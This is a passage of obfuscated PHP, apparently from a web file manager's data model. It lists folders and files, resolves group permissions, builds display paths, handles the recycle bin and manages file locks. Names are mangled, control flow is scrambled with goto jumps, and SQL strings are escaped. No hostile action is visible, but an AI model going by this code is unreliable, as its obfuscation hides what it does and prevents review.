$C÷ñùòâ¯Û[$EÃÛˆÊìø÷]; $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]][$Fá­ëŒœĞÛ[435]][] = array($Fá­ëŒœĞÛ[436] => $añ–Àƒ¬ò‘[$Fá­ëŒœĞÛ[367]], $Fá­ëŒœĞÛ[386] => $añ–Àƒ¬ò‘[$Fá­ëŒœĞÛ[28]], $Fá­ëŒœĞÛ[437] => $añ–Àƒ¬ò‘[$Fá­ëŒœĞÛ[438]]); } } if (isset($F’‰ ÕË§ó[$E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[369]]])) { $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]][$Fá­ëŒœĞÛ[439]] = array(); foreach ($F’‰ ÕË§ó[$E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[369]]] as $CƒÓãÛø˜ä) { $E“Ñø¦õáŞ[$Fá­ëŒœĞÛ[391]][$Fá­ëŒœĞÛ[439]] = array($Fá­ëŒœĞÛ[440] => $CƒÓãÛø˜ä[$Fá­ëŒœĞÛ[441]], $Fá­ëŒœĞÛ[442] => $CƒÓãÛø˜ä[$Fá­ëŒœĞÛ[443]], $Fá­ëŒœĞÛ[444] => $CƒÓãÛø˜ä[$Fá­ëŒœĞÛ[369]], $Fá­ëŒœĞÛ[445] => $CƒÓãÛø˜ä[$Fá­ëŒœĞÛ[446]], $Fá­ëŒœĞÛ[447] => $CƒÓãÛø˜ä[$Fá­ëŒœĞÛ[448]]); } } } return $AÌÒ½œèŸ; goto DãëÇâÆ’¾; b¾™˜”¦÷Ü: $C÷ñùòâ¯Û = array_to_keyvalue($d¤ùô¥°»ƒ, $Fá­ëŒœĞÛ[367]); $FØ‰¿™À‘¦ = array_to_keyvalue_group($c§Îİ¬¹çË, $Fá­ëŒœĞÛ[75], $Fá­ëŒœĞÛ[393]); $dã­™âÄ¯Æ = array_to_keyvalue($Böî¸âÃä, $Fá­ëŒœĞÛ[75]); goto CÆ‰Î—‘; B³î«¯°‹¯: $c§Îİ¬¹çË = Model($Fá­ëŒœĞÛ[392])->listData(); $Böî¸âÃä = Model($Fá­ëŒœĞÛ[381])->listData(); $d˜ã­ƒ”áŠ = Model($Fá­ëŒœĞÛ[429])->listSimple(); goto b¾™˜”¦÷Ü; DãëÇâÆ’¾: } protected function _listAppendChildren(&$cóœÌ¶á¯ğ, $F‘Ÿå‰ƒ) { goto A²”®Üš¶•; AÓİ»Ï¤Î: foreach ($cóœÌ¶á¯ğ as &$F†£Õ‡˜ŞÂ) { if ($F†£Õ‡˜ŞÂ[$C­Š†Š¬êÔ[370]]) { unset($F†£Õ‡˜ŞÂ[$C­Š†Š¬êÔ[372]]); $F†£Õ‡˜ŞÂ[$C­Š†Š¬êÔ[192]] = intval($cÃ‡Ü×¡»[$F†£Õ‡˜ŞÂ[$C­Š†Š¬êÔ[369]] . $C­Š†Š¬êÔ[451]][$C­Š†Š¬êÔ[452]]); $F†£Õ‡˜ŞÂ[$C­Š†Š¬êÔ[191]] = intval($cÃ‡Ü×¡»[$F†£Õ‡˜ŞÂ[$C­Š†Š¬êÔ[369]] . $C­Š†Š¬êÔ[453]][$C­Š†Š¬êÔ[452]]); } } goto C©‘‹¯ÔÉŠ; f¶‹Œ™¢½Ë: $CºÆÍ¸ë ˆ = 1024 * 50; $cóœÌ¶á¯ğ = is_array($cóœÌ¶á¯ğ) ? $cóœÌ¶á¯ğ : array(); $f‰Å“£½«• = count($cóœÌ¶á¯ğ); goto bÕó´Äì™; A²”®Üš¶•: $C­Š†Š¬êÔ =& $_SERVER[‚Ğ°–—î]; $eºˆŞäõÇ× = $C­Š†Š¬êÔ[361]; $cÃ‡Ü×¡» = array(); goto f¶‹Œ™¢½Ë; bÕó´Äì™: $F¾ğÊ¹ì‰œ = $this->tablePrefix . $this->tableName; for ($eèÒ•æÅßÊ = 0; $eèÒ•æÅßÊ < $f‰Å“£½«•; $eèÒ•æÅßÊ++) { $d›ˆ»ƒºĞ’ = intval($cóœÌ¶á¯ğ[$eèÒ•æÅßÊ][$C­Š†Š¬êÔ[397]]); if ($cóœÌ¶á¯ğ[$eèÒ•æÅßÊ][$C­Š†Š¬êÔ[370]]) { $E«™Ï¦é¨Ï = $cóœÌ¶á¯ğ[$eèÒ•æÅßÊ][$C­Š†Š¬êÔ[369]]; $eºˆŞäõÇ× .= "\123\105\114\x45\x43\124\40\52\x20\106\x52\x4f\115\x20\x28\x53\x45\114\105\103\x54\40\x27{$E«™Ï¦é¨Ï}\x5f\x68\141\163\x46\x69\154\145\47\x20\x61\x73\40\x68\141\x73\x2c\143\157\x75\x6e\x74\50\x31\51\x20\141\163\x20\150\x61\163\103\157\165\156\x74\40\x46\x52\x4f\x4d\x20\x60{$F¾ğÊ¹ì‰œ}\x60\x20\xa\x9\11\x9\x9\x9\167\150\x65\162\145\x20\160\x61\162\x65\x6e\x74\111\104\75{$E«™Ï¦é¨Ï}\x20\x61\156\x64\x20\151\163\106\157\154\144\145\162\75\x30\x20\141\156\x64\40\151\x73\104\x65\154\x65\164\145\x3d{$d›ˆ»ƒºĞ’}\x29\40\141\x73\x20\164\x62\61\137{$E«™Ï¦é¨Ï}\40\x75\x6e\x69\157\156\40\x61\154\154\x20\xa\x9\11\11\11\x9\x53\105\x4c\105\103\124\40\x2a\40\x46\x52\117\x4d\x20\x28\x53\105\114\x45\103\x54\40\47{$E«™Ï¦é¨Ï}\x5f\150\141\163\106\x6f\154\x64\145\162\x27\x20\x61\x73\x20\150\x61\163\106\x69\x6c\145\x2c\143\x6f\165\156\164\50\61\51\x20\x61\163\40\150\141\163\103\x6f\x75\156\x74\40\106\x52\x4f\x4d\x20\x60{$F¾ğÊ¹ì‰œ}\140\x20\12\x9\x9\x9\11\11\167\150\145\162\x65\x20\x70\x61\x72\145\156\164\111\104\75{$E«™Ï¦é¨Ï}\40\141\156\x64\40\151\x73\106\x6f\x6c\x64\145\162\x3d\x31\40\x61\x6e\144\x20\151\163\104\x65\x6c\145\x74\145\x3d{$d›ˆ»ƒºĞ’}\51\40\141\x73\x20\x74\142\x32\137{$E«™Ï¦é¨Ï}\40\165\x6e\151\x6f\x6e\x20\141\154\x6c\x20"; } if ((strlen($eºˆŞäõÇ×) >= $CºÆÍ¸ë ˆ || $eèÒ•æÅßÊ == $f‰Å“£½«• - 1) && $eºˆŞäõÇ×) { $eºˆŞäõÇ× = substr($eºˆŞäõÇ×, 0, -strlen($C­Š†Š¬êÔ[449])); $B‡£¶¦†  = $this->query($eºˆŞäõÇ×); $cÃ‡Ü×¡» = array_merge($cÃ‡Ü×¡», $B‡£¶¦† ); $eºˆŞäõÇ× = $C­Š†Š¬êÔ[33]; } } $cÃ‡Ü×¡» = array_to_keyvalue($cÃ‡Ü×¡», $C­Š†Š¬êÔ[450]); goto AÓİ»Ï¤Î; C©‘‹¯ÔÉŠ: } protected function _listAppendAuth(&$EÆ ÌàÔ‚‰) { goto Dö”ö”Ôñ; e¢ÀšÌ™³Ê: foreach ($EÆ ÌàÔ‚‰ as $Aà‹Ñ„ó¬Š) { if ($Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[371]] == self::TYPE_GROUP) { $a§®ŸàƒŞš[] = $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[369]]; } } if (!$a§®ŸàƒŞš) { return; } $FË¥Ì£«‰Í = array_to_keyvalue($EÆ ÌàÔ‚‰, $F˜šÃÑîšƒ[369]); goto F¹­§Ô³¼; Dö”ö”Ôñ: $F˜šÃÑîšƒ =& $_SERVER[‚Ğ°–—î]; if (!defined($F˜šÃÑîšƒ[427])) { return; } $a§®ŸàƒŞš = array(); goto e¢ÀšÌ™³Ê; F¹­§Ô³¼: $aæÕïâ‚¤¤ = Model($F˜šÃÑîšƒ[454])->getSourceList($a§®ŸàƒŞš, $FË¥Ì£«‰Í); foreach ($EÆ ÌàÔ‚‰ as $D¾¼°ùÎÎ => &$Aà‹Ñ„ó¬Š) { $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]] = $aæÕïâ‚¤¤[$Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[369]]]; if (!$Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]] && $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[371]] == self::TYPE_GROUP) { $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]] = Action($F˜šÃÑîšƒ[455])->pathGroupAuthMake($Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[456]]); if (!$Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]] && !_get($GLOBALS, $F˜šÃÑîšƒ[457])) { $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[189]] = !1; $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[188]] = !1; } } if ($Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]]) { $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[189]] = AuthModel::authCheckEdit($Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]][$F˜šÃÑîšƒ[377]]); $Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[188]] = AuthModel::authCheckView($Aà‹Ñ„ó¬Š[$F˜šÃÑîšƒ[376]][$F˜šÃÑîšƒ[377]]); } $this->groupPathDisplay($Aà‹Ñ„ó¬Š); } goto D¥²¸íÇÙÀ; D¥²¸íÇÙÀ: } public function groupPathDisplay(&$B¼é®È—×Ñ) { goto EŒ‹ñïÔ¯°; d²Ù»íâ: $B¼é®È—×Ñ[$B””¦¤»‡´[460]] = $F¹´Ï·æîä[$B””¦¤»‡´[461]]; $B¼é®È—×Ñ[$B””¦¤»‡´[380]] = $F¹´Ï·æîä[$B””¦¤»‡´[459]]; $B¼é®È—×Ñ[$B””¦¤»‡´[462]] = $F¹´Ï·æîä[$B””¦¤»‡´[463]]; goto F®‹äÊ¬¥—; F®‹äÊ¬¥—: $B¼é®È—×Ñ[$B””¦¤»‡´[464]] = $DŞñÌà‡»ª . $F¹´Ï·æîä[$B””¦¤»‡´[391]][$B””¦¤»‡´[369]]; goto Eè°…è²‹; EŒ‹ñïÔ¯°: $B””¦¤»‡´ =& $_SERVER[‚Ğ°–—î]; if ($B¼é®È—×Ñ[$B””¦¤»‡´[371]] != self::TYPE_GROUP) { return; } $F¹´Ï·æîä = Model($B””¦¤»‡´[458])->getInfo($B¼é®È—×Ñ[$B””¦¤»‡´[456]]); goto fÍÓŞñ¬ã¸; fÍÓŞñ¬ã¸: $eÖÍêÊ„— = $this->parentLevelArray($F¹´Ï·æîä[$B””¦¤»‡´[459]]); $DŞñÌà‡»ª = $B””¦¤»‡´[33]; foreach ($eÖÍêÊ„— as $dƒ¹ÌËØõ) { $b†‡ÀÔôÃô = Model($B””¦¤»‡´[458])->getInfo($dƒ¹ÌËØõ); $DŞñÌà‡»ª .= $b†‡ÀÔôÃô[$B””¦¤»‡´[391]][$B””¦¤»‡´[369]] . $B””¦¤»‡´[47]; } goto d²Ù»íâ; Eè°…è²‹: } protected function _listAppendPath(&$Fòğ…ƒŠøƒ) { goto cÃŠº½Í™; Eº¬®ÙæŒ‚: $D†ˆÌá’ŞØ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($Fòğ…ƒŠøƒ as &$cÂ‚¿­ˆ»Ÿ) { goto aô¥Ûò½Œä; Bê²‡Ø…§×: if ($Eî×õÁŸÎÛ) { $b¬Œ¼åñ¹ .= $cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[28]]; } if ($cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[370]]) { $b¬Œ¼åñ¹ .= $eáîÔ¬ÀéÇ[8]; } $cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[466]] = str_replace($eáîÔ¬ÀéÇ[467], $eáîÔ¬ÀéÇ[8], $b¬Œ¼åñ¹); goto Aİ¢ï¾¸ˆ¬; Aİ¢ï¾¸ˆ¬: $F¾ãİŒ¤Ì† = trim($cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[466]], $eáîÔ¬ÀéÇ[8]); if ($cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[461]] == $eáîÔ¬ÀéÇ[468] && $F¾ãİŒ¤Ì†) { $cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[28]] = $F¾ãİŒ¤Ì†; } $this->_listAppendPathRecycle($cÂ‚¿­ˆ»Ÿ, $Eî×õÁŸÎÛ, $D†ˆÌá’ŞØ); goto a´Ø‡¬ŒÛ; aô¥Ûò½Œä: $Eî×õÁŸÎÛ = $this->parentLevelArray($cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[459]]); $b¬Œ¼åñ¹ = $this->_listAppendPathRoot($cÂ‚¿­ˆ»Ÿ, $Eî×õÁŸÎÛ); foreach ($Eî×õÁŸÎÛ as $A¾ù¸‰‘Ô£) { if (isset($b²ÕÖ¶Ö[$A¾ù¸‰‘Ô£])) { $b¬Œ¼åñ¹ .= $b²ÕÖ¶Ö[$A¾ù¸‰‘Ô£] . $eáîÔ¬ÀéÇ[8]; } } goto Bê²‡Ø…§×; a´Ø‡¬ŒÛ: } goto bĞŞŒ‹»¸‹; cÃŠº½Í™: $eáîÔ¬ÀéÇ =& $_SERVER[‚Ğ°–—î]; $b²ÕÖ¶Ö = array(); foreach ($Fòğ…ƒŠøƒ as &$cÂ‚¿­ˆ»Ÿ) { $b²ÕÖ¶Ö[$cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[369]]] = $cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[28]]; $Eî×õÁŸÎÛ = $this->parentLevelArray($cÂ‚¿­ˆ»Ÿ[$eáîÔ¬ÀéÇ[459]]); array_shift($Eî×õÁŸÎÛ); foreach ($Eî×õÁŸÎÛ as $A¾ù¸‰‘Ô£) { if (!isset($b²ÕÖ¶Ö[$A¾ù¸‰‘Ô£])) { $b²ÕÖ¶Ö[$A¾ù¸‰‘Ô£] = 0; } } } goto dÎëíÇ½ìŠ; dÎëíÇ½ìŠ: $fğåÓÇ¡º = array(); foreach ($b²ÕÖ¶Ö as $Aæé—“Ùì† => $bËÎ°»‚Í) { if (!$bËÎ°»‚Í) { $fğåÓÇ¡º[] = $Aæé—“Ùì†; } } if ($fğåÓÇ¡º) { $d¼¼¤Åƒ– = array($eáîÔ¬ÀéÇ[383] => array($eáîÔ¬ÀéÇ[384], $fğåÓÇ¡º)); if (count($fğåÓÇ¡º) == 1) { $ağêÏ“•Â = $this->sourceInfo($fğåÓÇ¡º[0]); $ağêÏ“•Â = is_array($ağêÏ“•Â) ? array($ağêÏ“•Â) : !1; } else { $ağêÏ“•Â = $this->field($eáîÔ¬ÀéÇ[465])->where($d¼¼¤Åƒ–)->select(); } $Dñøœ²¹… = array_to_keyvalue($ağêÏ“•Â, $eáîÔ¬ÀéÇ[369], $eáîÔ¬ÀéÇ[28]); $b²ÕÖ¶Ö = array_merge_index($b²ÕÖ¶Ö, $Dñøœ²¹…); } goto Eº¬®ÙæŒ‚; bĞŞŒ‹»¸‹: } private function _listAppendPathRecycle(&$F…­‘áÁ‹Æ, $bö£¡‡ê¢, $b‘°»’…‹Ä) { goto AÊ¨¬ÒÅÚ°; e‡İÌ½Ä½: $f¡×„‡— = explode($fäÍø•ˆ­‘[8], trim($F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[466]], $fäÍø•ˆ­‘[8])); $e£ùµ‚Ûçğ = implode($fäÍø•ˆ­‘[8], array_slice($f¡×„‡—, 2)); $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[466]] = $fäÍø•ˆ­‘[8] . LNG($fäÍø•ˆ­‘[469]) . $fäÍø•ˆ­‘[8] . ltrim($e£ùµ‚Ûçğ, $fäÍø•ˆ­‘[8]); goto DÀ«½—â„š; AÊ¨¬ÒÅÚ°: $fäÍø•ˆ­‘ =& $_SERVER[‚Ğ°–—î]; if (intval($F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($b‘°»’…‹Ä, $bö£¡‡ê¢) && $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[369]] != $b‘°»’…‹Ä) { return; } goto e‡İÌ½Ä½; DÀ«½—â„š: $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[459]] = $fäÍø•ˆ­‘[470] . implode($fäÍø•ˆ­‘[47], array_slice($bö£¡‡ê¢, 1)) . $fäÍø•ˆ­‘[47]; if ($F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[369]] == $b‘°»’…‹Ä) { $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[459]] = $fäÍø•ˆ­‘[470]; $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[461]] = $fäÍø•ˆ­‘[468]; $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[28]] = LNG($fäÍø•ˆ­‘[469]); } $F…­‘áÁ‹Æ[$fäÍø•ˆ­‘[471]] = $fäÍø•ˆ­‘[472]; goto eÍÌæğô; eÍÌæğô: } protected function _listAppendPathRoot(&$F¬ìŠ±‡Üã, $aœå¼ùÂ’³) { $c†í£ŒØ¼“ =& $_SERVER[‚Ğ°–—î]; $Eù“ÏÄ¸ = $c†í£ŒØ¼“[33]; if ($F¬ìŠ±‡Üã[$c†í£ŒØ¼“[371]] == self::TYPE_USER) { if (defined($c†í£ŒØ¼“[427]) && $F¬ìŠ±‡Üã[$c†í£ŒØ¼“[456]] == USER_ID) { $Eù“ÏÄ¸ = LNG($c†í£ŒØ¼“[473]); if (!$aœå¼ùÂ’³) { $F¬ìŠ±‡Üã[$c†í£ŒØ¼“[28]] = $Eù“ÏÄ¸; } } else { $Dåè‡½—¥® = Model($c†í£ŒØ¼“[474])->getInfoSimple($F¬ìŠ±‡Üã[$c†í£ŒØ¼“[456]]); $Eù“ÏÄ¸ = LNG($c†í£ŒØ¼“[475]) . $c†í£ŒØ¼“[157] . $Dåè‡½—¥®[$c†í£ŒØ¼“[28]] . $c†í£ŒØ¼“[476]; } } else { if ($F¬ìŠ±‡Üã[$c†í£ŒØ¼“[371]] == self::TYPE_GROUP) { $Dåè‡½—¥® = Model($c†í£ŒØ¼“[458])->getInfoSimple($F¬ìŠ±‡Üã[$c†í£ŒØ¼“[456]]); $Eù“ÏÄ¸ = $Dåè‡½—¥®[$c†í£ŒØ¼“[28]]; } else { if ($F¬ìŠ±‡Üã[$c†í£ŒØ¼“[371]] == self::TYPE_SYSTEM) { $Dåè‡½—¥® = $this->sourceInfo($aœå¼ùÂ’³[0], !0); $Eù“ÏÄ¸ = $Dåè‡½—¥®[$c†í£ŒØ¼“[28]]; } } } $Eù“ÏÄ¸ = $Eù“ÏÄ¸ ? $c†í£ŒØ¼“[8] . $Eù“ÏÄ¸ . $c†í£ŒØ¼“[8] : $c†í£ŒØ¼“[8]; return $Eù“ÏÄ¸; } protected function _listAppendUser(&$EÓš¼»¹ÇÜ) { $AäÙÜ¼ƒÂâ =& $_SERVER[‚Ğ°–—î]; $aŠŠ…¯Œ˜ğ = array_to_keyvalue($EÓš¼»¹ÇÜ, $AäÙÜ¼ƒÂâ[33], $AäÙÜ¼ƒÂâ[378]); $DóÆ×Á—Œ¼ = array_to_keyvalue($EÓš¼»¹ÇÜ, $AäÙÜ¼ƒÂâ[33], $AäÙÜ¼ƒÂâ[379]); $FÕìº—‡¬³ = array_merge($aŠŠ…¯Œ˜ğ, $DóÆ×Á—Œ¼); $BÃÆ§ÚŒ = Model($AäÙÜ¼ƒÂâ[477])->userListInfo($FÕìº—‡¬³); foreach ($EÓš¼»¹ÇÜ as &$eËƒªÎ¨Å) { $C®Ê¶•’œÑ = $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[378]]; $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[378]] = $BÃÆ§ÚŒ[$C®Ê¶•’œÑ] ? $BÃÆ§ÚŒ[$C®Ê¶•’œÑ] : !1; $C®Ê¶•’œÑ = $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[379]]; $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[379]] = $BÃÆ§ÚŒ[$C®Ê¶•’œÑ] ? $BÃÆ§ÚŒ[$C®Ê¶•’œÑ] : !1; if (isset($eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[417]]) && $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[417]][$AäÙÜ¼ƒÂâ[478]]) { $E‹ĞÇàŸ³ = $GLOBALS[$AäÙÜ¼ƒÂâ[6]][$AäÙÜ¼ƒÂâ[84]][$AäÙÜ¼ƒÂâ[479]]; if ($eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[417]][$AäÙÜ¼ƒÂâ[480]] <= time() - $E‹ĞÇàŸ³) { $this->metaSet($eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[369]], $AäÙÜ¼ƒÂâ[478], null); $this->metaSet($eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[369]], $AäÙÜ¼ƒÂâ[480], null); unset($eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[417]][$AäÙÜ¼ƒÂâ[478]]); continue; } $DÂøŞÄ» = $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[417]][$AäÙÜ¼ƒÂâ[478]]; $eËƒªÎ¨Å[$AäÙÜ¼ƒÂâ[417]][$AäÙÜ¼ƒÂâ[481]] = Model($AäÙÜ¼ƒÂâ[477])->getInfoSimpleOuter($DÂøŞÄ»); } } } public function parentLevelArray($BÆªòÔš‰à) { $E¦«’â–É =& $_SERVER[‚Ğ°–—î]; $BÆªòÔš‰à = explode($E¦«’â–É[47], trim($BÆªòÔš‰à, $E¦«’â–É[47])); return array_remove_value($BÆªòÔš‰à, $E¦«’â–É[468]); } public function listAll($Fîâ“«£©) { goto F†“À•Úë®; C·âÑË†Ø£: $this->_listAppendAuth($c§ˆƒÄ‚É); $this->_listAppendUser($c§ˆƒÄ‚É); $this->_listAppendPath($c§ˆƒÄ‚É); goto d¼ÑŒºŒô; BàÚ’¦¦“: $AÙï©¾É¿• = array(); foreach ($c§ˆƒÄ‚É as $Fñ¥ÆÄ÷ÛÀ => $AÏ­Çƒ”­ã) { goto Bõç¯Æ——; B†ÀÔö„ß·: for ($EëöÉİ‰ÂŸ = 0; $EëöÉİ‰ÂŸ < count($c˜Ï®£‘Şâ); $EëöÉİ‰ÂŸ++) { $D¶šÒê›… .= $c§ˆƒÄ‚É[$c˜Ï®£‘Şâ[$EëöÉİ‰ÂŸ]][$A£äŸ¤îñé[28]] . $A£äŸ¤îñé[8]; } $D¶šÒê›… .= $AÏ­Çƒ”­ã[$A£äŸ¤îñé[28]]; if ($AÏ­Çƒ”­ã[$A£äŸ¤îñé[370]]) { $D¶šÒê›… .= $A£äŸ¤îñé[8]; } goto F×†²¸µµ; Dµ¦Ê½çÒ‡: if (!$AÏ­Çƒ”­ã[$A£äŸ¤îñé[370]]) { $fÙÖÒÁØ[$A£äŸ¤îñé[419]] = $AÏ­Çƒ”­ã[$A£äŸ¤îñé[419]]; $fÙÖÒÁØ[$A£äŸ¤îñé[489]] = $AÏ­Çƒ”­ã[$A£äŸ¤îñé[75]]; } $AÙï©¾É¿•[] = $fÙÖÒÁØ; goto F¦¸ÅŸŒ­Â; Bõç¯Æ——: $c˜Ï®£‘Şâ = $this->parentLevelArray($AÏ­Çƒ”­ã[$A£äŸ¤îñé[459]]); array_shift($c˜Ï®£‘Şâ); $D¶šÒê›… = $f»¢ùÃìÓ ; goto B†ÀÔö„ß·; F×†²¸µµ: $D¶šÒê›… = str_replace($A£äŸ¤îñé[467], $A£äŸ¤îñé[8], $D¶šÒê›…); $D¶šÒê›… = str_replace($A£äŸ¤îñé[467], $A£äŸ¤îñé[8], $D¶šÒê›…); $fÙÖÒÁØ = array($A£äŸ¤îñé[387] => str_replace($A£äŸ¤îñé[467], $A£äŸ¤îñé[8], $D¶šÒê›…), $A£äŸ¤îñé[488] => intval($AÏ­Çƒ”­ã[$A£äŸ¤îñé[370]]), $A£äŸ¤îñé[391] => $this->pathInfoFilter($AÏ­Çƒ”­ã, !0)); goto Dµ¦Ê½çÒ‡; F¦¸ÅŸŒ­Â: } return $AÙï©¾É¿•; goto dÓ±·ºï¯; E»¨²ØÙÊ”: $BÚÕÖ ‡µ = $A£äŸ¤îñé[486]; $b†„™Ñ¶Ç¾ = "\114\x45\106\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\137\x66\x69\x6c\145\40\146\151\x6c\x65\x20\157\x6e\x20\163\157\165\162\143\145\56\x66\151\154\x65\111\x44\x20\75\x20\146\151\154\x65\56\x66\x69\x6c\x65\111\x44"; $c§ˆƒÄ‚É = $this->alias($A£äŸ¤îñé[487])->field($BÚÕÖ ‡µ)->where($A™½›‰§âŒ)->join($b†„™Ñ¶Ç¾)->select(); goto C·âÑË†Ø£; d¼ÑŒºŒô: $c§ˆƒÄ‚É = array_to_keyvalue($c§ˆƒÄ‚É, $A£äŸ¤îñé[369]); $f»¢ùÃìÓ  = "\x2f{$dñ¸‹œÌ…Í[$A£äŸ¤îñé[28]]}\57"; $f»¢ùÃìÓ  = $f»¢ùÃìÓ  == $A£äŸ¤îñé[467] ? $A£äŸ¤îñé[8] : $f»¢ùÃìÓ ; goto BàÚ’¦¦“; F†“À•Úë®: $A£äŸ¤îñé =& $_SERVER[‚Ğ°–—î]; $dñ¸‹œÌ…Í = $this->sourceInfo($Fîâ“«£©); $A™½›‰§âŒ = array($A£äŸ¤îñé[482] => array($A£äŸ¤îñé[483], $dñ¸‹œÌ…Í[$A£äŸ¤îñé[459]] . $Fîâ“«£© . $A£äŸ¤îñé[484]), $A£äŸ¤îñé[485] => 0); goto E»¨²ØÙÊ”; dÓ±·ºï¯: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($cˆè—Î‡â‘) { goto B‚¸Ğöƒ´Î; B‚¸Ğöƒ´Î: $b×Ë©ÙÛ‘¨ =& $_SERVER[‚Ğ°–—î]; if (!$this->allowLock()) { return; } $this->_lockCheck($b×Ë©ÙÛ‘¨[490], $cˆè—Î‡â‘); goto b¶Ã¼àÕóÊ; dõ¨’Á’Ñ¹: $this->_lockEvent($cˆè—Î‡â‘, array($b×Ë©ÙÛ‘¨[493], $b×Ë©ÙÛ‘¨[494]), $eŒƒ…¦‚÷); $this->_lockCheckEnd($b×Ë©ÙÛ‘¨[490], $cˆè—Î‡â‘); goto a‹«½Õ´¸á; b¶Ã¼àÕóÊ: $eŒƒ…¦‚÷ = 1; $this->_lockEvent($cˆè—Î‡â‘, array($b×Ë©ÙÛ‘¨[491], $b×Ë©ÙÛ‘¨[492]), $eŒƒ…¦‚÷); $this->_lockParent($cˆè—Î‡â‘, array($b×Ë©ÙÛ‘¨[492]), $eŒƒ…¦‚÷); goto dõ¨’Á’Ñ¹; a‹«½Õ´¸á: } public function lockCopyEnd($A´¥Ã¤®) { $A½óé´¦ë¡ =& $_SERVER[‚Ğ°–—î]; if (!$this->allowLock()) { return; } $fñ¬ƒåÅäŒ = 0; $this->_lockEvent($A´¥Ã¤®, array($A½óé´¦ë¡[491], $A½óé´¦ë¡[492]), $fñ¬ƒåÅäŒ); $this->_lockParent($A´¥Ã¤®, array($A½óé´¦ë¡[492]), $fñ¬ƒåÅäŒ); $this->_lockEvent($A´¥Ã¤®, array($A½óé´¦ë¡[493], $A½óé´¦ë¡[494]), $fñ¬ƒåÅäŒ); } public function lockWriteStart($c¥È¦µ£«¦, $b–âîÉ½Œ = '') { goto eœù¯ñã; AÖÈãêÔ¾: $this->_lockParent($c¥È¦µ£«¦, array($c¤ °ƒ»Œ‚[490], $c¤ °ƒ»Œ‚[492]), $Dã‹ÙÀ«); $this->_lockCheckEnd($c¤ °ƒ»Œ‚[491], $c¥È¦µ£«¦); goto E£›áÏàÑÜ; eœù¯ñã: $c¤ °ƒ»Œ‚ =& $_SERVER[‚Ğ°–—î]; if (!$this->allowLock()) { return; } $this->_lockCheck($c¤ °ƒ»Œ‚[491], $c¥È¦µ£«¦); goto e¯ÜçöÃå; e¯ÜçöÃå: $Dã‹ÙÀ« = 1; $this->_lockKey($c¤ °ƒ»Œ‚[495] . $c¥È¦µ£«¦ . $c¤ °ƒ»Œ‚[91] . $b–âîÉ½Œ, $Dã‹ÙÀ«); $this->_lockEvent($c¥È¦µ£«¦, array($c¤ °ƒ»Œ‚[490], $c¤ °ƒ»Œ‚[492]), $Dã‹ÙÀ«); goto AÖÈãêÔ¾; E£›áÏàÑÜ: } public function lockWriteEnd($dµÏÉ‹àœ§, $D£†´ËØ‘ = '') { $A§ÌØ‘çé² =& $_SERVER[‚Ğ°–—î]; if (!$this->allowLock()) { return; } $F±Ã÷¤Æ„† = 0; $this->_lockKey($A§ÌØ‘çé²[495] . $dµÏÉ‹àœ§ . $A§ÌØ‘çé²[91] . $D£†´ËØ‘, $F±Ã÷¤Æ„†); $this->_lockEvent($dµÏÉ‹àœ§, array($A§ÌØ‘çé²[490], $A§ÌØ‘çé²[492]), $F±Ã÷¤Æ„†); $this->_lockParent($dµÏÉ‹àœ§, array($A§ÌØ‘çé²[490], $A§ÌØ‘çé²[492]), $F±Ã÷¤Æ„†); } public function lockMoveStart($D×õ”ØİµÎ) { goto cÙ‰Ö‰õ¤Ü; cÁ¶Ù¿êÆô: $this->_lockParent($D×õ”ØİµÎ, array($DÃ¶…ÇèÊ£[490], $DÃ¶…ÇèÊ£[492]), 